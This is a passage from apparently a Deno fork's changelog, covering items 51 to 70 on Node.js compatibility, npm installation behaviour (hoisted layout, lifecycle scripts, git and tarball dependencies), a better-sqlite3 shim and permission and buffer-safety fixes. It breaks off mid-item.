    project with only a deno.json keeps ESM for every file, and so does a
    package.json with `"type": "module"`. Opt out with `--no-detect-cjs` or
    `DENO_NO_DETECT_CJS=1` (the previous behavior: CommonJS only with
    `"type": "commonjs"`); `--unstable-detect-cjs` and
    `"unstable": ["detect-cjs"]` still apply Node's rule to every ambiguous
    file. The LSP uses the same rule. Not covered: Node's retry as ESM when a
    file redeclares a CommonJS wrapper name (`const require =
    ...`). Spec:
    `node/cjs_detect_default`.

52. **`fix`: CommonJS re-export analysis follows package `"imports"`**
    (`libs/node_resolver/analyze.rs`). `module.exports = { ...require('#x') }`
    contributed no names, because the analyzer resolved only relative, absolute
    and bare specifiers, so `import { PrismaClient } from
    "@prisma/client"`
    failed ("does not provide an export named"): `@prisma/client` re-exports
    `.prisma/client/default.js`, which is `{ ...require('#main-entry-point') }`.
    A `#` specifier now resolves through the referrer's closest package.json
    `"imports"` (with the require conditions); one that doesn't resolve
    contributes no names, as in Node. Spec: `npm/cjs_reexport_pkg_imports`
    (Prisma's shape).

53. **`feat(npm)`: npm's hoisted node_modules by default for package.json
    projects** (behavior change; `node_modules_linker_mode` in
    `libs/resolver/factory.rs`, `node-linker` in `libs/npmrc`). A project with a
    package.json and no deno.json now gets the hoisted layout npm writes (every
    package at `node_modules/<name>` unless versions conflict) instead of the
    isolated one (`node_modules/.deno/...` with only the direct dependencies
    linked at the top). Code that imports a package it doesn't list (a
    dependency's dependency such as `ms` under `debug`, an auto-installed peer
    such as `react` under `react-dom`) failed with
    `Import "react" not a dependency` / `Cannot find module 'ms'`; it now
    resolves, for Deno and for tools that walk node_modules themselves
    (bundlers, TypeScript, eslint plugins), which a resolver-only fallback would
    not have covered. Measured before choosing: the npm matrix on `denext.21`
    under both layouts gave the same result for every case but jest, which the
    hoisted installer broke by not placing aliased dependencies (fixed below).
    The layout's choice, in order: `--node-modules-linker`, deno.json
    `"nodeModulesLinker"`, `.npmrc` `node-linker=isolated|hoisted` (pnpm's
    setting; `pnp` is ignored), then the default (hoisted only for a
    package.json-only project with a manual node_modules; everything else stays
    isolated, and `.npmrc` hoisted is ignored where the hoisted linker can't
    apply). Opt out with `node-linker=isolated` in `.npmrc`,
    `--node-modules-linker=isolated`, or a deno.json. An existing isolated
    node_modules is replaced on the next `deno install` (its top-level links
    into `.deno` are removed, never what they point to). Making it the default
    meant fixing what the hoisted installer did not do yet: aliased dependencies
    (`"x": "npm:y@1"`, a dependency's such as pretty-format's
    `@jest/react-is-18`, which broke jest, or the root package.json's) are
    placed under the alias; a version only a workspace member depends on, which
    lost the top level to another member's, gets its own copy under
    `node_modules/.deno/.workspace-deps/` for the member's link; a package an
    earlier install already put in place (same name and version) is left there
    instead of being copied and reported again on every install, and its
    lifecycle scripts don't rerun (markers in
    `node_modules/.deno/.hoisted-scripts-run/`, cleared when a package is copied
    again); and its deprecation warning matches the isolated layout's. Specs
    that check the isolated layout's internals (`node_modules/.deno/...` paths,
    its lazy-caching output, a `--node-modules-dir=auto` run after a manual
    install, `install/deno_install_arch`, which also has a hoisted case) pin it
    with a `.npmrc`. The root package.json's aliases are recognized as the
    root's by canonical path: the installer's node_modules path is canonical and
    a package.json's directory is not, which on Windows differ by 8.3 short
    names, so the aliases were never placed there. Spec:
    `npm/hoisted_linker_default` (the layout, phantom imports from ESM and
    CommonJS, the opt-outs, an alias, switching from an isolated node_modules).

54. **`feat(npm)`: lifecycle scripts as npm runs them** (behavior change for the
    project's own scripts; `lifecycle_scripts.rs`, `cli/npm.rs`,
    `cli/task_runner.rs`).
    - The project's own scripts (the root package.json and workspace members)
      run on `deno install` without `--allow-scripts`, as npm runs them (they
      are the project's code, not a dependency's), on every explicit install,
      and include npm's `preprepare`/`prepare`/`postprepare` after `postinstall`
      (husky and similar set themselves up there). Before, the root package was
      listed under "Ignored build scripts" and needed approval, and `prepare`
      never ran. Dependencies' scripts still need approval. Opt out per package
      with deno.json `"allowScripts": { "deny": ["npm:<name>"] }`.
    - `node <flags>` in a lifecycle script (`node -e "..."`, `node -p`,
      `node --require x y.js`) runs Deno in Node.js mode through `node_shim`'s
      translation, as `child_process` does; it needed a real `node` before
      ("Error launching 'node'"). `deno install`, `add`, `approve-scripts`, `ci`
      and `x` also put the `node` shim on `PATH` (as `run` and `task` did), so
      `#!/usr/bin/env node` bins and native tools that start `node` work during
      an install.
    - `node-gyp` in a lifecycle script, when the project doesn't provide one,
      runs `npm:node-gyp@13.1.0` (an exact version, fetched on first use and
      checked against the registry's sha512 integrity like any package; isolated
      from the project: global cache, no config). Before it printed a warning
      and exited 0, so a package without a prebuilt binary (node-pty, an arm64
      or musl machine) installed without one. On demand rather than bundled:
      node-gyp is only useful with Python, make and a C++ toolchain, downloads
      Node.js headers anyway, and would add its dependency tree to every binary.
      `DENO_NODE_GYP` names another (an `npm:` specifier). Specs:
      `npm/lifecycle_scripts_root`, `npm/lifecycle_scripts_node_compat`.

55. **`feat`: `node` / `npx` executables and `deno run <dir>`** (behavior change
    for `deno run <dir>`; `cli/tools/x.rs`, `cli/node_compat_shim.rs`,
    `cli/args/mod.rs`).
    - `deno x --install-node-shims` writes `node` and `npx` next to the deno
      executable (as `--install-alias` writes `dx`): symlinks to `deno` on Unix,
      hardlinks (or copies) on Windows; it refuses to replace a file that isn't
      one. Invoked as `node`, deno already translated Node's command line and
      ran in Node.js mode; invoked as `npx` it is now `deno x`. With that
      directory on `PATH`, `node_modules/.bin/*`, `#!/usr/bin/env node` scripts,
      git hooks, Makefiles and editors work with no Node.js installed. denext's
      managed toolchain can run it from `denext toolchain link`.
    - `deno run .` / `deno run <dir>` runs the directory's entry as `node <dir>`
      does: package.json `"main"` (as a file, with `.js` or `.json`, or as a
      directory's index), else `index.js`; before, it failed with
      ERR_UNSUPPORTED_DIR_IMPORT. Spec: `run/dir_entrypoint`; unit tests for the
      `npx` dispatch.

56. **`feat`: a package.json project resolves packages without the `deno` export
    condition** (behavior change; `DenoConditionPolicy` in
    `libs/node_resolver/resolution.rs`, `CliOptions::deno_condition_policy`).
    Deno matches a package's `"deno"` `exports`/`imports` condition before
    `"node"`, which Node.js never does. Packages point it at a build made for
    Deno-native code that can lack what their Node.js build has. In the npm
    matrix four packages declare one: stripe's is its worker build (the
    synchronous `webhooks.constructEvent` throws, so the `stripe` case failed),
    jose's its browser build (WebCrypto keys only, no `KeyObject`),
    node-fetch-native's its native-fetch build and react-dom's the same file as
    its Node.js build. A project with a package.json and no deno.json now
    resolves with Node.js's conditions; a deno.json project, and a script with
    no config, keep the `deno` condition. `"denoCondition"` in the root
    deno.json or package.json chooses: `true` (every package), `false` (none),
    `{ "exclude": ["stripe"] }` (all but these), `{ "include": ["jose"] }` (only
    these); `DENO_NO_DENO_CONDITION=1` turns it off everywhere. A package's
    `require` conditions never had it. Not covered: `deno compile`'s runtime and
    the LSP resolve with the default conditions, as they already ignored
    `--conditions`. Spec: `npm/deno_export_condition`; npm matrix: `stripe`
    passes (`expect` raised).

57. **`feat`: TypeScript resolution as tsx and ts-node resolve it, in a
    package.json project** (behavior change; `is_node_project` and
    `CliOptions::node_project_sloppy_imports` /
    `compiler_options_paths_for_execution` in `cli/args/mod.rs`,
    `WorkspaceResolver::set_compiler_options_paths_for_execution` in
    `libs/resolver/workspace.rs`). The rule: a workspace with a package.json and
    no deno.json anywhere is a Node.js project, and gets
    - Deno's sloppy imports by default: an extensionless (`./lib/a`), directory
      (`./dir` to `./dir/index.ts`) or `.js`-for-`.ts` (`./a.js` naming `a.ts`)
      relative import resolves, as tsx and ts-node (and TypeScript's
      `moduleResolution: "bundler"`, which already turned them on) resolve it.
      Opt out with `DENO_NO_SLOPPY_IMPORTS=1`.
    - tsconfig.json's `compilerOptions.paths` (with `baseUrl`) for the code that
      runs, not only for type checking: `@/lib/x` resolves through the pattern,
      its candidates probed for extensions, and a specifier a pattern matches
      but none of whose candidates exist falls back to the package of that name,
      as tsconfig-paths does (type checking keeps reporting it). A package's own
      imports (a referrer under `node_modules`) never go through it. Opt out
      with `DENO_NO_TSCONFIG_PATHS=1`. A deno.json keeps Deno's strict
      resolution, and so does a script with no config. Also:
      `ignoreDeprecations` in compilerOptions reaches the type checker, so a
      tsconfig.json with `baseUrl`, which TypeScript 6 deprecates, can keep it
      as TypeScript says (`"ignoreDeprecations": "6.0"`); before, Deno dropped
      the option and type checking failed. Not covered: `compilerOptions.paths`
      in a `deno compile` binary's runtime. Spec:
      `npm/node_project_ts_resolution`; npm matrix: `ts-paths`.

58. **`feat(npm)`: git and tarball dependencies, and `file:` dependencies'
    bins** (`libs/npm_installer/remote.rs`, `PackageJsonRemoteDep` in
    `libs/package_json`, the lockfile's `npmRemote`). package.json dependencies
    npm accepts that aren't registry packages failed with "Not implemented
    scheme" and were left out:
    - git: `git+https://`, `git+http://`, `git+ssh://` (scp-like `git@host:path`
      too), `git+file://`, `git://`, an http(s) URL ending in `.git`, and the
      `github:`, `gitlab:`, `bitbucket:`, `gist:` shorthands (a bare `user/repo`
      is GitHub), at `#<branch|tag|commit>` (abbreviated too), `#semver:<range>`
      (the highest matching tag, `v` optional) or the default branch;
    - a tarball: any other http(s) URL, or a `file:` path to a `.tgz`.
      `deno install` (and `add`, `ci`, ... with a manual node_modules) fetches
      each into `node_modules/.deno/.remote/<alias>@<hash>`, linked at
      `node_modules/<alias>`; its own registry dependencies install with the
      rest and are linked into its `node_modules` (both layouts), and its `bin`
      goes into `node_modules/.bin`. deno.lock records, as package-lock.json
      does, a tarball's sha512 integrity (a later download that doesn't match is
      refused) and a git dependency's commit (checked out on later installs
      instead of resolving the ref again; `--reload` resolves it again), under
      `npmRemote`; `--frozen` fails when one is missing or changed. A tarball on
      a `.npmrc` registry gets that registry's credentials. git runs without a
      shell: package.json's value is checked when it is parsed (no option-like
      or `ext::` URL, no revision expression or option as a ref), git gets only
      `https`, `http`, `ssh`, `git` and `file` (`GIT_ALLOW_PROTOCOL`), no
      terminal prompt, no hooks (`git init --template=`), no submodules;
      fetching happens only in the package manager commands (`install`, `add`,
      `remove`, `ci`, `cache`, `outdated`, `list`, `approve-scripts`), never on
      `deno run`, whose permissions don't cover it, and `--cached-only` refuses
      to fetch. Not covered, unlike npm: a git dependency's `prepare` build and
      npm's packing (`files`) are not run, a fetched package's install scripts
      are not run (a warning says so), and a git or tarball dependency of one of
      those is left out (a warning). A `file:` directory dependency's `bin` is
      now linked into `node_modules/.bin` too (it wasn't). Specs:
      `npm/remote_deps` (hoisted and isolated layouts, git tag and `semver:`,
      tarball URL, `file:` bin, lockfile entries, a tarball that doesn't match
      its integrity), unit tests for the parsing and its refusals; npm matrix:
      `git-tarball-deps`.

59. **`feat(npm)`: the project's own lifecycle scripts print their output, and
    `.npmrc` `ignore-scripts`** (behavior change; `cli/npm.rs`,
    `LifecycleScriptsConfig::ignore_scripts`). The root package.json's and
    workspace members' scripts (item 54) ran with their output captured and
    shown only on failure; they now run in the foreground as npm runs them: a
    `> name@version script` banner and `> command` line, then their output as it
    is written, one package at a time. A dependency's scripts stay quiet unless
    they fail, as with npm. `ignore-scripts=true` in `.npmrc` (or
    `npm_config_ignore_scripts=true`) is npm's opt-out: `deno install` runs no
    lifecycle scripts, the project's own included, and doesn't list a
    dependency's as ignored; an allow list (`--allow-scripts=npm:<name>`,
    deno.json `allowScripts`) still runs the dependencies it names. Spec:
    `npm/lifecycle_scripts_root_output`; `npm/workspace_lifecycle_scripts` now
    expects the banners.

60. **`fix(ext/node)`: `process.send()` may run JS while it serializes**
    (`ext/node/ops/ipc.rs`). `op_node_ipc_write_json` and
    `op_node_ipc_write_advanced` serialize the message inside the op, and that
    runs JS: getters, `toJSON`, and the traps of `process.env`'s proxy, which
    call `op_get_env`. A debug build panicked on that re-entrant op call ("op
    op_node_ipc_write_json was not marked as #[op2(reentrant)]"); a release
    build skips the check. Both ops are now `#[op2(reentrant)]` (neither holds
    an `OpState` borrow while the message is serialized), and a `toJSON` or
    getter that throws is an error instead of an `unwrap` panic. Node's
    `test-child-process-fork-args.js` (`process.send({ env: process.env })`) is
    enabled. Spec: `node/ipc_send_runs_js` (JSON and advanced serialization).

61. **`feat(ext/node)`: `better-sqlite3` over `node:sqlite`** (behavior change
    for projects that depend on better-sqlite3;
    `ext/node/polyfills/internal/better_sqlite3.js`, `01_require.js`,
    `ext/node_sqlite`). better-sqlite3 is a nan addon, built against Node's V8
    C++ ABI, which Deno can't load, so `require("better-sqlite3")` and
    `import Database from "better-sqlite3"` failed (no binding, or a prebuilt
    binary that can't link). The package's entry modules (`lib/index.js`,
    `lib/database.js`, `lib/sqlite-error.js` of a package whose package.json is
    named `better-sqlite3`, installed or in the global cache) now resolve to a
    built-in implementation of its API over the same SQLite engine as
    `node:sqlite`: statements (`run`/`get`/`all`/`iterate`,
    `pluck`/`raw`/`expand`, `bind`, `columns`, `reader`/`readonly`), binding
    with better-sqlite3's rules and errors (arrays spread, one named object,
    `undefined` as `NULL`, too few/many values are RangeErrors), Buffers for
    blobs, lossy numbers for integers past 2^53 unless `safeIntegers()` /
    `defaultSafeIntegers()`, transactions with savepoint nesting and the
    `deferred`/`immediate`/`exclusive` variants, `pragma`, user functions and
    aggregates (window functions too), `backup`, `serialize` and a database
    opened from a buffer, `loadExtension`, `unsafeMode` (defensive mode off),
    `verbose` (expanded SQL, long values shortened as better-sqlite3's build
    does), the busy/iterating rules, and `SqliteError` with SQLite's extended
    result-code names (`SQLITE_CONSTRAINT_PRIMARYKEY`). It opens with
    better-sqlite3's build defaults (foreign keys on, a 16 MB page cache,
    defensive mode). The real package's own test suite (v12.11.1, mocha) passes
    252 of 301; the rest are virtual tables (`db.table()`, not available: 37),
    the `progress` and abort semantics of `backup()` (7), `LIMIT` on
    `UPDATE`/`DELETE` (a compile-time option, 2), a compiled test extension and
    `nativeBinding` (3). Opt out with `DENO_NO_BETTER_SQLITE3_COMPAT=1`, which
    loads the package's own code. The package's install script is not needed, so
    it installs without `--allow-scripts`. Two new ops in `ext/node_sqlite`
    report what better-sqlite3 needs and `node:sqlite` doesn't expose
    (`sqlite3_stmt_readonly`, parameter names, `sqlite3_total_changes64`).
    `node:sqlite` fixes found on the way, in Node's direction: an error SQLite
    raised in `exec()` / `prepare()` / backup carries `errcode` / `errstr` like
    the others (it came through rusqlite without them); `exec()` runs every
    statement to completion as `sqlite3_exec()` does (rusqlite's
    `execute_batch()` stepped a row-returning statement once, so
    `SELECT f(x) FROM t` called a user function for one row); and a user
    function or aggregate that throws inside `all()` / `iterate()` no longer
    hangs (the step error was taken for a row and the statement stepped again,
    rerunning the callback), nor does an aggregate's `start()` run again, or its
    result function replace the pending exception, when SQLite finalizes the
    failed aggregate. The npm matrix's `better-sqlite3` case now passes, and
    three cases join it (57 programs): Drizzle, Knex and Kysely on
    better-sqlite3. Spec: `node/better_sqlite3_override` (CommonJS, ESM, the
    opt-out).

62. **`fix`: CommonJS detection retries as ES module like Node**
    (`libs/resolver/cjs/esm_only.rs`, `libs/resolver/cjs/mod.rs`). Node compiles
    an ambiguous file as CommonJS first and runs it as an ES module when that
    fails with an error only CommonJS throws: a top-level `let` / `const` /
    `class` (or `using`) declaring one of the wrapper's parameters
    (`const require = createRequire(...)`, `let module`), or an `await` outside
    any function. Item 45's detection missed both: swc parses a file whose
    `await` sits in a nested top-level block (`if (x) { await y; }`, a loop
    body) as a script, so such a file that also used a CommonJS binding (by
    default) or any ambiguous file (with `--unstable-detect-cjs`) ran as
    CommonJS, failed to compile, and the retry in `Module._compile` then threw
    "Cannot require() ES Module ... in a cycle" for the main module. The
    resolver now parses an ambiguous file it would make CommonJS and keeps it
    ESM when either applies (`var` and `function` may redeclare a parameter and
    stay CommonJS, as do declarations in nested scopes), cached per file with
    the textual check, and only when the text contains `await` or a wrapper
    name. Spec: `node/cjs_detect_esm_retry`; unit tests for the walk.

63. **`feat`: an `npm` executable** (`cli/npm_shim.rs`,
    `cli/node_compat_shim.rs`, `cli/tools/x.rs`). The shims command
    (`deno x --install-node-shims`) also writes `npm` (beside `node` and `npx`),
    and deno invoked as `npm` maps npm's common commands onto its own:
    `npm install` / `ci` (`--omit=dev`, `--production`: `--prod`),
    `npm install <pkg>...` (`deno add npm:<pkg>`, with `-D`, `-O`, `-E`,
    `--no-save`), `npm install -g` (`deno install -g -A -f`), `npm uninstall`
    (`deno remove`), `npm run <script> [-- args]`, `npm test` / `start` / `stop`
    / `restart` (`deno task`, with `--if-present`, `--workspaces`, `-w <name>`,
    `--prefix`), `npm exec [-y] [-p pkg] [--] <cmd>` (`deno x`),
    `npm init <initializer>` / `npm create` (`deno init --npm`), and
    `npm init [-y]`, which writes npm's default package.json (keeping an
    existing one's fields). npm's flags that change nothing here (`--no-audit`,
    `--no-fund`, `--legacy-peer-deps`, `--loglevel`, ...) are accepted; anything
    else, including other commands and git, file or tarball package specs, fails
    with a message naming what the shim supports rather than doing something npm
    wouldn't. `DENO_DISABLE_NODE_SHIM=1` turns it off with the others. Spec:
    `npm/npm_shim` (run, test, install from the registry, init, an unsupported
    command); unit tests for the mapping.

64. **`fix`: a package's scope stops at `node_modules`**
    (`libs/node_resolver/package_json.rs`, `libs/resolver/cjs/mod.rs`). Node
    looks for the package.json whose `"type"` applies to a file
    (`getPackageScopeConfig`) only up to the nearest `node_modules` folder: a
    file in a folder under node_modules with no package.json of its own belongs
    to no package. Deno kept walking up to the project's package.json, so with
    `"type": "module"` there such a file (a vendored dependency without a
    package.json, as in Node's `es-modules/package-type-module` fixture) ran as
    an ES module and `module.exports` threw "module is not defined". CommonJS
    detection now uses Node's lookup (`get_package_scope_config`); the
    closest-package.json walk used elsewhere is unchanged. Enables Node's
    `test-require-module.js`, `-twice.js`, `-dynamic-import-1.js` and `-2.js`
    (ignored as "fixtures rely on Node's implicit CommonJS detection"), and
    `test-esm-default-type.mjs` and `test-esm-type-field-errors.js`, which pass
    now. Spec: `node/package_scope_node_modules`; a unit test for the lookup.

65. **`feat(ext/node)`: `async_hooks` reports promises** (`libs/core`,
    `ext/node/polyfills/internal/async_hooks.ts`, `async_hooks.ts`). The fork's
    `async_hooks` emulation never emitted `PROMISE` resources (Node's
    `updatePromiseHookMode` was a TODO), kept the execution context as a bare
    stack (`executionAsyncId()` was 0 in the main script, where Node says 1, and
    `triggerAsyncId()` was always 0), and its `AsyncResource` took no options.
    Ported from Node's `lib/internal/async_hooks.js`: enabling a hook installs
    promise hooks (`v8.promiseHooks`) that give each promise an async id and its
    parent's as trigger, and emit `init` / `before` / `after` /
    `promiseResolve`; `createHook({ trackPromises })` (Node 24) opts a hook out;
    the execution and trigger ids live in `async_id_fields` with a stack of
    saved pairs, so `executionAsyncId()` / `triggerAsyncId()` match Node in
    promise reactions, timers and `runInAsyncScope`; `AsyncResource` takes
    `{ triggerAsyncId, requireManualDestroy }` (or a trigger id), validates
    them, and has `triggerAsyncId()`; hook callbacks are called with the hook as
    `this`. Promises Deno's runtime makes for itself would be reported too,
    which Node, whose callback APIs create no promises, never does: an async
    op's promise and a lazily loaded module's evaluation are created inside a
    new core scope (`Deno.core.isCreatingInternalPromise()`), and a promise
    created or settled with no JS on the stack (a module evaluation V8 makes,
    such as the one Deno runs a CommonJS main through) is left out as well.
    Enables 23 Node tests (`async-hooks/test-promise*.js`,
    `test-track-promises-*.js`, `test-embedder.api.async-resource*.js`,
    `parallel/test-async-hooks-promise*.js`, `-enable-disable-enable.js`,
    `-async-await.js`, `test-async-wrap-trigger-id.js`,
    `async-hooks/test-crypto-pbkdf2.js` and `-randomBytes.js`, ...). Spec:
    `node/async_hooks_promise_resources` (the event sequence Node 24 prints for
    the same program, less Node's own TickObject).

66. **`fix(ext/node)`: `node:test`'s `t.waitFor()`, `t.plan()` options and
    per-test mocks** (`ext/node/polyfills/testing.ts`).
    `t.waitFor(condition,
    { interval, timeout })` (Node 22.14) was missing;
    `t.plan(count,
    options)` ignored and didn't validate `options`; and
    `t.mock` was the process-wide mock, so a test's mock timers stayed enabled
    for the next test ("MockTimers is already enabled") and its method mocks
    stayed in place. Each test context now has its own `t.mock`, which restores
    what the test mocked and resets the timers it enabled when the test finishes
    (as Node resets each test's MockTracker), in `it()` inside `describe()` too;
    and `mock.timers.enable({ now })` reports a negative or non-integer `now` as
    `ERR_INVALID_ARG_VALUE`. Enables `test-runner-wait-for.js` and
    `test-runner-plan.mjs`. Spec: `node/node_test_context_wait_for`.

67. **`fix(ext/node)`: a CommonJS main module reached through a symlink or an
    8.3 short name loads** (`ext/node/ops/require.rs`). The loader resolves a
    CommonJS module to its real path (`Module._findPath`), then resolves and
    reads it under that path, checking read access each time. Access was granted
    for the spelling the module was loaded under (the main module's graph URL),
    so a main module reached through a symlinked directory, or on Windows from a
    working directory with an 8.3 short name in it (`C:\Users\RUNNER~1`), was
    refused with "Requires read access" before it ran; with CommonJS detection
    on by default (item 51) that includes bundled output and untyped JavaScript.
    Stock Deno 2.9.6 fails the same way for `deno run /link/main.cjs`.
    `op_require_real_path` now remembers the real path of each path it was
    allowed to read, and the require ops accept those (reading the real path of
    an allowed path reads the same file; nothing is recorded when read access is
    fully granted). Spec: `node/cjs_main_symlinked_dir`.

68. **Upstream batch: Node.js-compatibility and npm pull requests** (branch
    `feat/upstream-prs-node-dd`). Carried from open denoland/deno pull requests,
    one commit each with an `Original-Author:` trailer and the PR's head SHA;
    our own changes are separate commits after them.
    - TLS and HTTP: an empty TLS write completes, so HTTPS keep-alive goes on
      after `res.end()` (#36986); an unread request body no longer stalls the
      next keep-alive request (#36828); `server.close()` closes a connection
      that never sent a request (#36749); an empty-body HTTP/2 response still
      emits `'end'` (#36864); RST after a complete response is not an
      `ECONNRESET` (#36424).
    - Modules: a file in any `node_modules` tree gets Node's package.json
      CommonJS rules, which fixes `deno x @playwright/mcp` (#36412);
      `registerHooks` load hooks see `context.format` (#36849), and `.node` /
      `.json` go through their extension handlers under a load hook (#36243);
      `require("file://...")` resolves, for Vite configs bundled to ESM (#35482;
      Node refuses it, so this is a superset).
    - Processes and fs: `spawnSync()` keeps process stdio fds (#36855), a
      numeric fd for stdin (#36582) and an explicit `env` without the parent's
      (#36999); `process.cwd()` follows `Deno.chdir()` through a wrapped
      `process.chdir` (graceful-fs) (#36328); `process.ref()` /
      `process.unref()` (#37016); fs write ops return >2 GiB counts as Numbers
      (#36817); `net.Socket({ fd })` can't adopt signal-hook's self-pipe, a
      signal-thread panic (#35607); `ipv6Only` on `::` (#36893).
    - zlib and streams: the `dictionary` option for deflate and raw inflate
      (#37036); no trailing empty zstd frames (#36689; an end that exactly fills
      the output buffer gets no empty frame, where Node's would);
      `Readable.prototype.wrap()` proxies the first method (#36566).
    - crypto: RSA JWK modulus check (#36156), `raw-private` / `raw-public`
      KeyObject formats (#36912), X.509 name string types (#36252),
      `checkHost()` prefers SAN (#36250), X.509 v1 chains verified by signature
      instead of name matching (#36248; replaced at the
      [2.9.8 sync](#upstream-syncs) by upstream's own
      [#36933](https://github.com/denoland/deno/pull/36933), which validates v1
      chains the way OpenSSL does: signatures, validity, `basicConstraints`,
      `keyUsage` / `extendedKeyUsage`, `CertificateVerify` and path building
      with backtracking. #36248's `tls_wrap.rs` changes and its `x509-parser`
      dependency of `deno_node` were dropped; its `tests/unit_node/tls_test.ts`
      cases and `tests/testdata/tls/localhost_v1*` fixtures stay, now run
      against upstream's code: a forged v1 leaf is `CERT_SIGNATURE_FAILURE`, as
      in Node 24, where #36248 said `UNABLE_TO_VERIFY_LEAF_SIGNATURE`; a v1 leaf
      signed by a `CA:FALSE` certificate is `INVALID_PURPOSE`, where Node 24
      says `UNSPECIFIED` (key usage does not include certificate signing) and
      #36248 said `UNABLE_TO_GET_ISSUER_CERT_LOCALLY`); UTF-16LE Buffer writes
      through V8 (#36804).
    - npm: unchanged `.bin` shims are not rewritten (Windows os error 32,
      #36447); an optional dependency that doesn't exist is skipped with a
      warning (#36606); BYONM lookups stay inside the configured root (#36134).

    Our follow-ups: `TLSSocket.setMaxSendFragment()` is implemented (rustls is
    fed at most that much plaintext per record), which is what npm:tedious /
    mssql / `@prisma/adapter-mssql` need over TLS; it replaces #36719, whose
    premise (Node encrypts each `writev` buffer separately) is wrong: Node 24
    sends a corked 4096/4096/54 batch as one record, and as 4096/4096/54 only
    under `setMaxSendFragment(4096)`. `registerHooks` formats follow Node's
    CommonJS loader (#36849 gave every possibly-CommonJS `.js` file "commonjs",
    which broke `require()` of an ES module in an untyped package under any load
    hook, and gave `.node` "commonjs", undoing #36243): `.node` is "addon",
    `.js` takes its package.json `"type"` or stays undefined, and the ES module
    bridge reports "json" / "wasm" / "commonjs" by media type; a pass-through
    hook keeps `.wasm` imports working. An optional dependency blocked by
    `minimumDependencyAge` fails the install again, as the PR's reviewer
    required and pnpm does (#36606 skipped it, which can drop the host's own
    prebuild). `test-stream2-readable-wrap-proxy-methods.js` is enabled
    (#36566's test).

    Found when the batch was first built and tested, on top of the node-compat
    line: #36864's own test still failed, because the client stream closes in
    the same nghttp2 batch as the final HEADERS and the deferred close ended its
    readable side before the code awaiting `'response'` ran (Node reaches JS
    through `MakeCallback`, which runs the nextTick queue and the microtasks
    between callbacks); a clean close of a client stream whose `'response'` is
    still queued now waits for `setImmediate`, and a reset keeps the nextTick so
    its `'error'` is still emitted. The load hook's `"type"` lookup threw at the
    file system root; it now walks parents as Node's `TraverseParent` does (not
    the root, and not past a `node_modules` directory). #36912's raw key import
    lost `validateString` (and `sig.ts` its `Buffer`) to the fork's
    `loadExtScript` imports, which failed `test-crypto-sign-verify.js`. #36447
    met item 58's bin linking with two clippy errors.

    Not carried: #36719 (replaced, above); #37020
    (`deno desktop
    --engine=quickjs` only; a draft); #36201, #35614, #33210,
    #36442, #36479, #36103 (red upstream CI in their own suites; carried with
    fixes in item 75); #36330, #36831 (rework the installer's bin linking and
    lifecycle scripts, which items 53, 54 and 58 of the node-compat line also
    rewrite; port them on top of that); #36349 (raw fd adoption, needs sidecar /
    `spawnSelf` testing; carried in item 75); #36909 (perf, not measured);
    #36455 (4.3k lines, needs a real `uv_poll` addon).

    Tests: each pull request's own (`tests/unit_node`, `tests/specs`,
    `tests/napi` where present, Rust unit tests), plus `unit_node/tls_test.ts`'s
    `setMaxSendFragment` record and argument tests, the `module_register_hooks`
    `format_js` and `wasm_passthrough` specs, and the
    `install/optional_dep_missing_version` spec. Node compat tests enabled:
    `test-http-server-close-idle-connections-pre-request.js` (#36749),
    `test-process-ref-unref.js` (#37016), `test-crypto-sign-verify.js` (#36912),
    `test-stream2-readable-wrap-proxy-methods.js`.

69. **`fix(permissions)`: deny scopes hold through symlinks**
    (`runtime/permissions`, `ext/fs/ops.rs`, `ext/node/lib.rs`). Builds on
    denoland/deno#33894 (carried as its own commit), which re-checks the deny
    rules against the canonicalized path. Three gaps were left. The
    canonicalizer kept a dangling symlink as named:
    `allowed/link ->
    denied/new.txt` was checked as `allowed/link`, so
    `Deno.copyFile` (and `node:fs` `copyFileSync`) created `denied/new.txt`
    under `--deny-write`; on Unix a plain write already failed with `NotFound`
    through `O_NOFOLLOW`, and Windows has no such guard. The path is now
    resolved through the symlink chain (at most 40 hops; a cycle is `ELOOP`).
    The no-follow checks (lstat, remove, rename, mkdir, link, and recursive
    remove) skipped the re-check, but the kernel still follows the parent
    directories, so `allowed/dir ->
    denied` let
    `Deno.removeSync("allowed/dir/x")` delete a denied file: when a path-scoped
    deny or ignore rule exists, the parent is resolved and the deny rules
    re-checked (a recursive remove also refuses a deny scope inside the resolved
    path). And some operations that follow the final symlink were checked as
    no-follow, so a link to a denied file was written or read: the `copyFile`
    destination, `chmod`, `chown`, `utime`, `stat`, `readDir` and
    `process.loadEnvFile` now use the following access kinds (`truncate` stays
    no-follow; it opens with `O_NOFOLLOW`). So do the ones that resolve the
    final symlink and report on its target, which revealed through a link
    whether a denied file exists, its resolved name or its metadata:
    `Deno.realPath` (and `node:fs` `realpath`), `Deno.chdir`, `node:fs` `exists`
    / `existsSync` and `statfs` / `statfsSync`. Only a deny rule is applied to
    the resolved path; an `--allow-*` scope is still matched against the path as
    given, as in upstream Deno (creating a symlink needs full read and write
    access). Spec: `permission/symlink_resolve_deny` (`--deny-write` with
    `--allow-write` and with a scoped `--allow-write=allowed`, and
    `--deny-read`).

70. **`fix(core)`: op buffers never borrow shared or resizable memory**
    (`libs/core/runtime/ops.rs`, `libs/ops/op2`, `libs/serde_v8`). Ports
    denoland/deno#36260, which does not compile upstream: the new fast-call code
    handed the op `#temp.as_mut()`, borrowing a temporary for less than the
    slice lifetime the op signature asks for (E0716 / E0521); the slice is now
    cast to that lifetime, which is sound because the temporary lives to the end
    of the fast call. The bug: op buffer arguments (`&[u8]`, `&mut [u8]`, raw
    pointers, `JsBuffer` / `V8Slice` held across an await) borrowed the backing
    store directly even when it was a `SharedArrayBuffer` (another thread writes
    it while Rust holds a slice) or a resizable `ArrayBuffer` (JavaScript can
    shrink it while an async op holds a slice; V8 decommits the pages and the
    op's write faults). The pull request refuses such buffers for mutable
    arguments with a `TypeError`, which would break Node code that reads into
    `SharedArrayBuffer`-backed views (`fs.readSync` / `readvSync` / `read`,
    `crypto.randomFill(Sync)`, `TextEncoder.encodeInto`, `Deno.readSync`). Here
    they get a sound fallback instead: the op works on a private copy, and only
    the bytes it changed are written back, with relaxed atomic stores for a
    shared buffer, and for a resizable one on its own thread, clamped to its
    current length. A sync op writes back when the call ends. A `JsBuffer`
    writes back when its last clone drops; if that happens on another thread (a
    blocking task), the bytes are queued on the runtime that made the copy and
    applied by its op driver before the next op resolves. The queue belongs to
    that runtime: when it is torn down (a terminated worker), queued bytes are
    freed with it and later ones are dropped, never kept. Bytes the op did not
    change are left alone, so JavaScript or a worker writing the buffer while an
    async op runs is not overwritten. Read-only arguments are copied as in the
